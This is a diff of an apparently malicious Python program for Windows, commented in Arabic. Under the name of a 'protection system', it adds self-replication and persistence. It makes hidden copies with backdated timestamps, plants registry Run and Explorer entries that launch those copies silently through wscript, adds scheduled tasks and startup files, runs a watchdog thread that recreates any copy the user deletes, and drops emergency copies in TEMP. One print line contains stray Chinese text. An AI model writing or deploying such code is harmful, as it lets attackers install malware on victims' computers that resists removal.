-                                        print(f"   🔨 جاري تجديد: {basename}")
+                                        result = subprocess.run(f'attrib "{location}"', shell=True, capture_output=True, text=True)
+                                        if "H" not in result.stdout:
+                                            system_status['protected_files'].append(os.path.basename(location))
+                                    except:
+                                        pass
                                         
-                                        # حذف الملف القديم إذا كان موجوداً
-                                        if os.path.exists(location):
-                                            os.remove(location)
-                                        
-                                        # إنشاء نسخة جديدة
-                                        shutil.copy2(self.original_path, location)
-                                        subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
-                                        print(f"   ✅ تم تجديد: {basename}")
-                                        
-                                        # انتظر بين كل إنشاء
-                                        time.sleep(1)
-                                        
-                                    except Exception as e:
-                                        print(f"   ❌ فشل تجديد {basename}: {e}")
+                            except Exception as e:
+                                system_status['corrupted_files'].append(os.path.basename(location))
+                        
+                        # فحص الريجستري (كل 10 دورات)
+                        if protection_cycle % 10 == 0:
+                            system_status['registry_entries'] = self.check_registry_entries()
+                        
+                        # فحص المهام المجدولة (كل 15 دورة)
+                        if protection_cycle % 15 == 0:
+                            system_status['scheduled_tasks'] = self.check_scheduled_tasks()
+                        
+                        # تقرير الحماية (كل 3 دورات)
+                        if protection_cycle % 3 == 0:
+                            self.print_protection_report(protection_cycle, system_status)
+                        
+                        # الإصلاح الذكي
+                        files_to_recreate = (
+                            system_status['missing_files'] + 
+                            system_status['outdated_files'] + 
+                            system_status['corrupted_files']
+                        )
+                        
+                        if files_to_recreate:
+                            print(f"🔄 اكتشاف {len(files_to_recreate)} ملف يحتاج إصلاح: {files_to_recreate}")
+                            self.intelligent_repair(files_to_recreate, system_status)
+                        
+                        # إعادة حماية الملفات (كل 5 دورات)
+                        if protection_cycle % 5 == 0:
+                            self.reprotect_files(system_status['protected_files'])
+                        
+                        # تنظيف الذاكرة والملفات المؤقتة (كل 30 دقيقة)
+                        if time.time() - last_cleanup_time > 1800:
+                            self.system_cleanup()
+                            last_cleanup_time = time.time()
+                        
+                        # إنشاء نسخ احتياطية إضافية إذا لزم الأمر
+                        if len(system_status['healthy_files']) < 3:
+                            print("⚠️ عدد الملفات السليمة قليل، جاري إنشاء نسخ إضافية...")
+                            self.create_emergency_backups()
                     
-                    # فاصل بين الدورات
-                    time.sleep(5)  # فحص كل 10 ثواني
+                    # فاصل ذكي بين الدورات (يتكيف مع حالة النظام)
+                    sleep_time = self.calculate_sleep_time(system_status)
+                    time.sleep(sleep_time)
                     
                 except Exception as e:
-                    print(f"⚠️ خطأ في الحماية: {e}")
-                    time.sleep(20)
+                    print(f"⚠️ خطأ في نظام الحماية: {e}")
+                    time.sleep(30)  # انتظار أطول في حالة الخطأ
         
-        # تشغيل خيط حماية واحد فقط بدلاً من 3
-        thread = threading.Thread(target=protection_worker, daemon=True)
-        thread.start()
-        print("🛡️ بدء نظام الحماية الذكية المتقدم")  
+        def check_registry_entries(self):
+            """فحص إدخالات الريجستري"""
+            try:
+                registry_entries = []
+                check_entries = [
+                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                    (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+                ]
+                
+                for hkey, subkey in check_entries:
+                    try:
+                        with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ) as key:
+                            i = 0
+                            while True:
+                                try:
+                                    name, value, _ = winreg.EnumValue(key, i)
+                                    if any(os.path.basename(copy_path) in value for copy_path in self.backup_copies):
+                                        registry_entries.append(f"{name}: {os.path.basename(subkey)}")
+                                    i += 1
+                                except WindowsError:
+                                    break
+                    except:
+                        pass
+                
+                return registry_entries
+            except:
+                return []
+        
+        def check_scheduled_tasks(self):
+            """فحص المهام المجدولة"""
+            try:
+                tasks = []
+                result = subprocess.run('schtasks /query /fo list', shell=True, capture_output=True, text=True)
+                
+                for line in result.stdout.split('\n'):
+                    if 'TaskName' in line and any(os.path.basename(copy_path) in line for copy_path in self.backup_copies):
+                        tasks.append(line.split(':')[-1].strip())
+                
+                return tasks
+            except:
+                return []
+        
+        def intelligent_repair(self, files_to_recreate, system_status):
+            """إصلاح ذكي للملفات التالفة"""
+            repair_strategies = [
+                self.quick_repair,
+                self.advanced_repair,
+                self.emergency_repair
+            ]
+            
+            for location in self.system_locations:
+                basename = os.path.basename(location)
+                if basename in files_to_recreate:
+                    # اختيار استراتيجية الإصلاح بناءً على حالة الملف
+                    if basename in system_status['corrupted_files']:
+                        strategy = self.emergency_repair
+                    elif basename in system_status['missing_files']:
+                        strategy = self.advanced_repair
+                    else:
+                        strategy = random.choice(repair_strategies)
+                    
+                    success = strategy(location, basename)
+                    
+                    if success:
+                        print(f"   ✅ تم إصلاح: {basename}")
+                    else:
+                        print(f"   ❌ فشل إصلاح: {basename}")
+        
+        def quick_repair(self, location, basename):
+            """إصلاح سريع"""
+            try:
+                if os.path.exists(location):
+                    os.remove(location)
+                
+                shutil.copy2(self.original_path, location)
+                subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
+                time.sleep(0.5)
+                return True
+            except:
+                return False
+        
+        def advanced_repair(self, location, basename):
+            """إصلاح متقدم"""
+            try:
+                # محاولة متعددة
+                for attempt in range(3):
+                    try:
+                        if os.path.exists(location):
+                            os.remove(location)
+                        
+                        shutil.copy2(self.original_path, location)
+                        
+                        # إخفاء متقدم
+                        subprocess.run(f'attrib +h +s +r "{location}"', shell=True, capture_output=True)
+                        
+                        # تغيير الوقت
+                        old_time = time.time() - random.randint(3600, 86400)
+                        os.utime(location, (old_time, old_time))
+                        
+                        time.sleep(1)
+                        return True
+                        
+                    except:
+                        time.sleep(2)
+                        continue
+                
+                return False
+            except:
+                return False
+        
+        def emergency_repair(self, location, basename):
+            """إصلاح طارئ"""
+            try:
+                # إنشاء في موقع بديل أولاً
+                temp_location = location + ".tmp"
+                shutil.copy2(self.original_path, temp_location)
+                
+                if os.path.exists(location):
+                    for _ in range(5):  # 5 محاولات
+                        try:
+                            os.remove(location)
+                            break
+                        except:
+                            time.sleep(1)
+                            continue
+                
+                os.rename(temp_location, location)
+                subprocess.run(f'attrib +h +s +r "{location}"', shell=True, capture_output=True)
+                time.sleep(2)
+                return True
+            except:
+                return False
+        
+        def reprotect_files(self, unprotected_files):
+            """إعادة حماية الملفات"""
+            for location in self.system_locations:
+                basename = os.path.basename(location)
+                if basename in unprotected_files and os.path.exists(location):
+                    try:
+                        subprocess.run(f'attrib +h +s +r "{location}"', shell=True, capture_output=True)
+                    except:
+                        pass
+        
+        def system_cleanup(self):
+            """تنظيف النظام"""
+            try:
+                # تنظيف الملفات المؤقتة
+                temp_dir = os.getenv('TEMP')
+                for root, dirs, files in os.walk(temp_dir):
+                    for file in files:
+                        if file.startswith('system_') and file.endswith('.tmp'):
+                            try:
+                                os.remove(os.path.join(root, file))
+                            except:
+                                pass
+                
+                print("🧹 تم تنظيف الملفات المؤقتة")
+            except:
+                pass
+        
+        def create_emergency_backups(self):
+            """إنشاء نسخ احتياطية طارئة"""
+            try:
+                emergency_locations = [
+                    os.path.join(os.getenv('TEMP'), f"emergency_{random.randint(10000,99999)}.pyw"),
+                    os.path.join(os.getenv('USERPROFILE'), f"temp_{random.randint(10000,99999)}.pyw"),
+                ]
+                
+                for location in emergency_locations:
+                    try:
+                        shutil.copy2(self.original_path, location)
+                        subprocess.run(f'attrib +h +s "{location}"', shell=True, capture_output=True)
+                        self.backup_copies.append(location)
+                        print(f"🆘 نسخة طارئة: {os.path.basename(location)}")
+                    except:
+                        continue
+            except:
+                pass
+        
+        def calculate_sleep_time(self, system_status):
+            """حساب وقت الانتظار الذكي"""
+            base_sleep = 10  # 10 ثواني أساسية
+            
+            # تقليل وقت الانتظار إذا كانت هناك مشاكل
+            if (len(system_status['missing_files']) > 2 or 
+                len(system_status['corrupted_files']) > 1):
+                return 5  # 5 ثواني فقط
+            
+            # زيادة وقت الانتظار إذا كان النظام مستقراً
+            if (len(system_status['healthy_files']) > 5 and 
+                len(system_status['missing_files']) == 0):
+                return 30  # 30 ثانية
+            
+            return base_sleep
+        
+        def print_protection_report(self, cycle, status):
+            """طباعة تقرير الحماية"""
+            print(f"\n📊 تقرير الحماية المتقدم - الدورة #{cycle}")
+            print(f"   ✅ الملفات السليمة: {len(status['healthy_files'])}")
+            print(f"   🔄 الملفات القديمة: {len(status['outdated_files'])}")
+            print(f"   ❌ الملفات المفقودة: {len(status['missing_files'])}")
+            print(f"   🚨 الملفات التالفة: {len(status['corrupted_files'])}")
+            print(f"   🛡️ الملفات غير محمية: {len(status['protected_files'])}")
+            
+            if status['registry_entries']:
+                print(f"   📝 إدخالات ريجستري: {len(status['registry_entries'])}")
+            
+            if status['scheduled_tasks']:
+                print(f"   ⏰ مهام مجدولة: {len(status['scheduled_tasks'])}")
+            
+            if (len(status['missing_files']) == 0 and 
+                len(status['corrupted_files']) == 0):
+                print("   🎉 حالة النظام: ممتازة")
+            else:
+                print("   ⚠️ حالة النظام: تحتاج انتباه")
+        
+        # تشغيل نظام الحماية
+        protection_thread = threading.Thread(target=protection_worker, daemon=True)
+        protection_thread.start()
+        print("🛡️ بدء نظام الحماية الذكية المتقدم - الإصدار المحسن") 
+
     def install_complete_independent_system(self):
-        """تثبيت النظام المستقل الكامل"""
-        print("=" * 50)
-        print("🤖 بدء تثبيت النظام المستقل...")
-        print("=" * 50)
+        """تثبيت النظام المستقل الكامل مع تحسينات متقدمة"""
+        print("=" * 60)
+        print("🤖 بدء تثبيت النظام المستقل المتقدم...")
+        print("=" * 60)
         
-        # 1. إنشاء النسخ
-        print("\n📁 المرحلة 1: إنشاء النسخ الاحتياطية...")
-        copies = self.create_multiple_copies()
-        print(f"   📊 النتيجة: {len(copies)} من أصل {len(self.system_locations)} نسخة")
+        start_time = time.time()
+        installation_stats = {
+            'copies_created': 0,
+            'registry_entries': 0,
+            'scheduled_tasks': 0,
+            'startup_files': 0,
+            'shell_entries': 0,
+            'failed_attempts': 0
+        }
         
-        # 2. تثبيت الريجستري
-        print("\n📝 المرحلة 2: تثبيت إدخالات الريجستري...")
-        reg_count = self.install_registry_with_multiple_paths()
-        print(f"   📊 النتيجة: {reg_count} إدخال ريجستري")
+        # المرحلة 0: التحضير الأولي
+        print("\n🔧 المرحلة 0: الإعدادات الأولية...")
+        try:
+            # تحويل الملف إلى .pyw إذا لزم الأمر
+            self.convert_to_pyw_if_needed()
+            print("   ✅ تحويل الامتداد إلى .pyw")
+            
+            # ربط امتداد .pyw إذا أمكن
+            self.associate_pyw_files()
+            print("   ✅ ربط امتداد .pyw")
+            
+        except Exception as e:
+            print(f"   ⚠️  تحذير في الإعدادات: {e}")
         
-        # 3. تثبيت المهام المجدولة
-        print("\n⏰ المرحلة 3: تثبيت المهام المجدولة...")
-        task_count = self.install_scheduled_tasks_with_multiple_paths()
-        print(f"   📊 النتيجة: {task_count} مهمة مجدولة")
+        # المرحلة 1: إنشاء النسخ المتقدمة
+        print("\n📁 المرحلة 1: إنشاء النسخ الاحتياطية المتقدمة...")
+        try:
+            copies = self.create_multiple_copies()
+            installation_stats['copies_created'] = len(copies)
+            
+            # إنشاء نسخ إضافية إذا كان العدد قليلاً
+            if len(copies) < 5:
+                print("   🔄 إنشاء نسخ إضافية...")
+                additional_copies = self.create_emergency_backups()
+                copies.extend(additional_copies)
+                installation_stats['copies_created'] = len(copies)
+            
+            print(f"   📊 النتيجة: {len(copies)} من أصل {len(self.system_locations)} نسخة")
+            
+            # تشغيل جميع النسخ للتأكد
+            print("   🚀 تشغيل النسخ للتأكد...")
+            running_copies = 0
+            for copy_path in copies:
+                if self.start_copy(copy_path):
+                    running_copies += 1
+                    time.sleep(0.3)  # فاصل بين التشغيل
+            
+            print(f"   ⚡ النسخ النشطة: {running_copies} من {len(copies)}")
+            
+        except Exception as e:
+            print(f"   ❌ خطأ في إنشاء النسخ: {e}")
+            installation_stats['failed_attempts'] += 1
         
-        # 4. تثبيت بدء التشغيل
-        print("\n🚀 المرحلة 4: تثبيت بدء التشغيل...")
-        startup_count = self.install_startup_with_multiple_paths()
-        print(f"   📊 النتيجة: {startup_count} ملف بدء تشغيل")
+        # المرحلة 2: تثبيت الريجستري المتقدم
+        print("\n📝 المرحلة 2: تثبيت إدخالات الريجستري المتقدمة...")
+        try:
+            reg_count = self.install_registry_with_multiple_paths()
+            installation_stats['registry_entries'] = reg_count
+            
+            # محاولات إضافية إذا كانت النتائج ضعيفة
+            if reg_count < 3:
+                print("   🔄 محاولة تثبيت ريجستري إضافية...")
+                additional_reg = self.install_additional_registry_entries()
+                reg_count += additional_reg
+                installation_stats['registry_entries'] = reg_count
+            
+            print(f"   📊 النتيجة: {reg_count} إدخال ريجستري")
+            
+        except Exception as e:
+            print(f"   ❌ خطأ في الريجستري: {e}")
+            installation_stats['failed_attempts'] += 1
         
-        # 5. تثبيت Shell
-        print("\n🐚 المرحلة 5: تثبيت إدخالات Shell...")
-        shell_count = self.install_shell_entries_with_multiple_paths()
-        print(f"   📊 النتيجة: {shell_count} إدخال Shell")
+        # المرحلة 3: تثبيت المهام المجدولة المتقدمة
+        print("\n⏰ المرحلة 3: تثبيت المهام المجدولة المتقدمة...")
+        try:
+            task_count = self.install_scheduled_tasks_with_multiple_paths()
+            installation_stats['scheduled_tasks'] = task_count
+            
+            # تأكيد المهام المثبتة
+            if task_count > 0:
+                print("   🔍 التحقق من المهام المثبتة...")
+                verified_tasks = self.verify_scheduled_tasks()
+                print(f"   ✅ المهام المؤكدة: {verified_tasks}")
+            
+            print(f"   📊 النتيجة: {task_count} مهمة مجدولة")
+            
+        except Exception as e:
+            print(f"   ❌ خطأ في المهام المجدولة: {e}")
+            installation_stats['failed_attempts'] += 1
         
-        # 6. بدء الحماية
-        print("\n🛡️ المرحلة 6: بدء نظام الحماية...")
-        self.start_intelligent_protection()
+        # المرحلة 4: تثبيت بدء التشغيل المتقدم
+        print("\n🚀 المرحلة 4: تثبيت بدء التشغيل المتقدم...")
+        try:
+            startup_count = self.install_startup_with_multiple_paths()
+            installation_stats['startup_files'] = startup_count
+            
+            # التحقق من ملفات بدء التشغيل
+            active_startup = self.check_active_startup_files()
+            print(f"   🔍 ملفات بدء التشغيل النشطة: {active_startup}")
+            
+            print(f"   📊 النتيجة: {startup_count} ملف بدء تشغيل")
+            
+        except Exception as e:
+            print(f"   ❌ خطأ في بدء التشغيل: {e}")
+            installation_stats['failed_attempts'] += 1
         
-        total = reg_count + task_count + startup_count + shell_count
-        print(f"\n🎯 الإجمالي: {total} طريقة تشغيل تلقائي!")
-        print("🤖 النظام المستقل جاهز - يمكن حذف الملف الأصلي!")
-        return total
+        # المرحلة 5: تثبيت إدخالات Shell المتقدمة
+        print("\n🐚 المرحلة 5: تثبيت إدخالات Shell المتقدمة...")
+        try:
+            shell_count = self.install_shell_entries_with_multiple_paths()
+            installation_stats['shell_entries'] = shell_count
+            
+            # تثبيت إضافي لإدخالات Shell
+            if shell_count < 5:
+                print("   🔄 تثبيت إدخالات Shell إضافية...")
+                additional_shell = self.install_additional_shell_entries()
+                shell_count += additional_shell
+                installation_stats['shell_entries'] = shell_count
+            
+            print(f"   📊 النتيجة: {shell_count} إدخال Shell")
+            
+        except Exception as e:
+            print(f"   ❌ خطأ في إدخالات Shell: {e}")
+            installation_stats['failed_attempts'] += 1
+        
+        # المرحلة 6: بدء نظام الحماية المتقدم
+        print("\n🛡️ المرحلة 6: بدء نظام الحماية المتقدم...")
+        try:
+            self.start_intelligent_protection()
+            
+            # بدء أنظمة حماية إضافية
+            self.start_additional_protection_systems()
+            print("   ✅ أنظمة الحماية الإضافية مفعلة")
+            
+            print("   📊 نظام الحماية الذكية يعمل بنجاح")
+            
+        except Exception as e:
+            print(f"   ❌ خطأ في نظام الحماية: {e}")
+            installation_stats['failed_attempts'] += 1
+        
+        # المرحلة 7: التحقق النهائي والتقارير
+        print("\n📋 المرحلة 7: التحقق النهائي والتقارير...")
+        try:
+            # تقرير الأداء
+            total_time = time.time() - start_time
+            total_methods = (installation_stats['registry_entries'] + 
+                            installation_stats['scheduled_tasks'] + 
+                            installation_stats['startup_files'] + 
+                            installation_stats['shell_entries'])
+            
+            # تقييم نجاح التثبيت
+            success_rate = self.calculate_success_rate(installation_stats)
+            
+            print("=" * 60)
+            print("🎯 تقرير التثبيت النهائي:")
+            print("=" * 60)
+            print(f"   📁 النسخ الم创建的: {installation_stats['copies_created']}")
+            print(f"   📝 إدخالات الريجستري: {installation_stats['registry_entries']}")
+            print(f"   ⏰ المهام المجدولة: {installation_stats['scheduled_tasks']}")
+            print(f"   🚀 ملفات بدء التشغيل: {installation_stats['startup_files']}")
+            print(f"   🐚 إدخالات Shell: {installation_stats['shell_entries']}")
+            print(f"   ❌ المحاولات الفاشلة: {installation_stats['failed_attempts']}")
+            print(f"   ⏱️ وقت التثبيت: {total_time:.2f} ثانية")
+            print(f"   📈 معدل النجاح: {success_rate}%")
+            print(f"   🎯 الإجمالي: {total_methods} طريقة تشغيل تلقائي!")
+            
+            # توصيات بناءً على النتائج
+            self.provide_installation_recommendations(installation_stats)
+            
+            if success_rate >= 70:
+                print("\n✅ النظام المستقل جاهز بالكامل - يمكن حذف الملف الأصلي!")
+                print("🔒 النظام سيعمل تلقائياً بعد إعادة التشغيل")
+            else:
+                print("\n⚠️  التثبيت ناجح جزئياً - يوصى بإعادة التشغيل والتحقق")
+                
+        except Exception as e:
+            print(f"   ❌ خطأ في التقرير النهائي: {e}")
+        
+        return total_methods
+
+    # الدوال المساعدة الجديدة
+    def install_additional_registry_entries(self):
+        """تثبيت إدخالات ريجستري إضافية"""
+        try:
+            additional_count = 0
+            extra_entries = [
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "StartupApproved"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "StartupApproved"),
+            ]
+            
+            for hkey, subkey, value_name in extra_entries:
+                try:
+                    if self.backup_copies:
+                        random_path = random.choice(self.backup_copies)
+                    else:
+                        random_path = self.original_path
+                    
+                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"')
+                    
+                    additional_count += 1
+                except:
+                    continue
+            
+            return additional_count
+        except:
+            return 0
+
+    def verify_scheduled_tasks(self):
+        """التحقق من المهام المجدولة المثبتة"""
+        try:
+            verified_count = 0
+            result = subprocess.run('schtasks /query /fo list', shell=True, capture_output=True, text=True)
+            
+            for line in result.stdout.split('\n'):
+                if any(os.path.basename(copy_path) in line for copy_path in self.backup_copies):
+                    verified_count += 1
+            
+            return verified_count
+        except:
+            return 0
+
+    def check_active_startup_files(self):
+        """التحقق من ملفات بدء التشغيل النشطة"""
+        try:
+            active_count = 0
+            startup_folders = [
+                os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
+            ]
+            
+            for folder in startup_folders:
+                if os.path.exists(folder):
+                    for file in os.listdir(folder):
+                        if file.endswith(('.vbs', '.js', '.wsf', '.cmd', '.bat')):
+                            active_count += 1
+            
+            return active_count
+        except:
+            return 0
+
+    def install_additional_shell_entries(self):
+        """تثبيت إدخالات Shell إضافية"""
+        try:
+            additional_count = 0
+            extra_shell_entries = [
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Explorer", "ShellState"),
+            ]
+            
+            for hkey, subkey, value_name in extra_shell_entries:
+                try:
+                    if self.backup_copies:
+                        random_path = random.choice(self.backup_copies)
+                    else:
+                        random_path = self.original_path
+                    
+                    with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
+                        winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'wscript.exe /e:vbscript "CreateObject(\"Wscript.Shell\").Run \"\"\"{random_path}\"\"\", 0, False"')
+                    
+                    additional_count += 1
+                except:
+                    continue
+            
+            return additional_count
+        except:
+            return 0
+
+    def start_additional_protection_systems(self):
+        """بدء أنظمة حماية إضافية"""
+        try:
+            # بدء مراقبة الريجستري
+            registry_monitor_thread = threading.Thread(target=self.monitor_registry_changes, daemon=True)
+            registry_monitor_thread.start()
+            
+            # بدء مراقبة الملفات
+            file_monitor_thread = threading.Thread(target=self.monitor_critical_files, daemon=True)
+            file_monitor_thread.start()
+            
+            return True
+        except:
+            return False
+
+    def calculate_success_rate(self, stats):
+        """حساب معدل نجاح التثبيت"""
+        total_attempts = (stats['copies_created'] + stats['registry_entries'] + 
+                        stats['scheduled_tasks'] + stats['startup_files'] + 
+                        stats['shell_entries'])
+        
+        if total_attempts == 0:
+            return 0
+        
+        success_rate = (total_attempts / (total_attempts + stats['failed_attempts'])) * 100
+        return round(success_rate, 1)
+
+    def provide_installation_recommendations(self, stats):
+        """تقديم توصيات بناءً على نتائج التثبيت"""
+        recommendations = []
+        
+        if stats['copies_created'] < 3:
+            recommendations.append("• إنشاء المزيد من النسخ الاحتياطية")
+        
+        if stats['registry_entries'] < 2:
+            recommendations.append("• إضافة المزيد من إدخالات الريجستري")
+        
+        if stats['scheduled_tasks'] < 1:
+            recommendations.append("• تثبيت المهام المجدولة")
+        
+        if stats['startup_files'] < 2:
+            recommendations.append("• زيادة ملفات بدء التشغيل")
+        
+        if recommendations:
+            print("\n💡 التوصيات:")
+            for recommendation in recommendations:
+                print(f"   {recommendation}")
 
     def delete_original_and_switch(self):
         """حذف آمن للملف الأصلي مع التأكد من عمل النسخ"""
@@ -1780,6 +2794,7 @@ class IndependentReplicationSystem:
         except Exception as e:
             print(f"❌ خطأ في حذف الملف الأصلي: {e}")
             return False
+
 
 # === النظام اللانهائي مع النسخ المستقل ===
 class InfinitePermanentSystem:
